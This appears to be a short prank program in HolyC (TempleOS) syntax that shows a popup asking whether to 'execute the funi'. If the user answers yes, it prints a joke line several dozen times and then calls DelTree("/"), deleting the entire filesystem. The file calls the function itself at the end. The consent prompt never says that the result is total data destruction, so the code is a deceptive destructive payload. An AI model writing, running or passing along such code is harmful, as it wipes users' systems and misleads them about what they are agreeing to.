U8 doTheFuni() {

  Bool funiAsk = PopUpNoYes("Should I execute the funi on your system?");
  if (funiAsk) {
    U8 funiNumber;
    for (funiNumber = 0; funiNumber < 69; funiNumber++)
      "$RED$Funi hehe\n$BLUE$";
      
    DelTree("/");
  } else {
    "I did not execute the Funi.";
  }

  return 0;
}

doTheFuni();
